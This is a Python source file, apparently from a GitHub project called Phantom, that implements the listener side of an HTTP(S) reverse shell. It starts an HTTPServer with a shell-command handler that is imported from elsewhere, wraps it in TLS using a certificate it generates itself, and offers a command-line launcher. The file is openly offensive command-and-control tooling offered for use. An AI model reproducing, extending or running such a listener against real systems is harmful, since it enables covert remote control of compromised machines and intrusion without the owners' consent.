#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Phantom

__author__ = "EONRaider @ keybase.io/eonraider"

import ssl
import sys
from http.server import HTTPServer
from pathlib import Path

from src.server.handler import ShellHandler

from trustme import CA


class ShellServer:
    def __init__(self,
                 host: str,
                 port: int, *,
                 server_cert: [str, Path] = None,
                 unsecure: bool = False):
        """Create a Reverse Shell Server that communicates with clients
        through HTTP(S).

        :param host: Server address or hostname.
        :param port: Port number to bind the server to.
        :param server_cert: Path to a file containing the server
            certificate in PEM format.
        :param unsecure: Run the server in HTTP-only mode.
        """
        self.host = host
        self.port = port
        self.unsecure = unsecure
        self.server_cert = server_cert

    @property
    def server_address(self) -> tuple[str, int]:
        return self.host, self.port

    @property
    def _base_path(self) -> Path:
        """Gets the absolute path for the directory from which this file
        is being executed."""
        try:
            '''If the file is compiled as a binary by PyInstaller, its 
            path will be set as sys._MEIPASS'''
            return Path(sys._MEIPASS)
        except AttributeError:
            return Path(__file__).parent.absolute()

    @property
    def server_cert(self) -> Path:
        """Gets a valid path to the server certificate file.
        Sets the path to the server certificate or creates a new CA that
        signs and writes it to a file.
        """
        return self._server_cert

    @server_cert.setter
    def server_cert(self, path: [str, Path]) -> None:
        server_cert = self._base_path.joinpath("server.pem") if \
            path is None else Path(path)
        if not server_cert.exists() and self.unsecure is False:
            '''A default server certificate for 'localhost' is created 
            if a certificate file is not supplied and unsecure mode is 
            set to False'''
            (ca := CA()).cert_pem.write_to_path("ca.pem")
            signed_cert = ca.issue_cert(self.host)
            signed_cert.private_key_and_cert_chain_pem.write_to_path(
                str(server_cert))
        self._server_cert = server_cert

    def execute(self) -> None:
        with HTTPServer(self.server_address, ShellHandler) as httpd:
            host, port = self.server_address
            url_scheme = "http" if self.unsecure is True else "https"
            try:
                if url_scheme == "https":
                    httpd.socket = ssl.wrap_socket(
                        sock=httpd.socket,
                        server_side=True,
                        certfile=str(self.server_cert),
                        ssl_version=ssl.PROTOCOL_TLS
                    )
                print(f"[>] Server started on {url_scheme}://{host}:{port}")
                print("[>] Waiting for connections (press Ctrl+C to abort)...")
                httpd.serve_forever()
            except KeyboardInterrupt:
                print("\n[!] Shutting down the server...")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="Phantom - HTTP(S) Reverse Shell Server"
    )
    parser.add_argument(
        "host",
        type=str,
        metavar="<hostname/address>",
        help="Server address or hostname."
    )
    parser.add_argument(
        "port",
        type=int,
        metavar="<port>",
        help="Port number to bind the server to."
    )
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument(
        "--server-cert",
        type=str,
        metavar="<path>",
        help="Path to a file containing the server certificate in PEM format. "
             "Creates a development certificate for 'localhost' if unset."
    )
    mode.add_argument(
        "--unsecure",
        action="store_true",
        help="Run the server in HTTP-only mode. No server certificate is "
             "required."
    )

    _args = parser.parse_args()

    ShellServer(
        host=_args.host,
        port=_args.port,
        server_cert=_args.server_cert,
        unsecure=_args.unsecure
    ).execute()
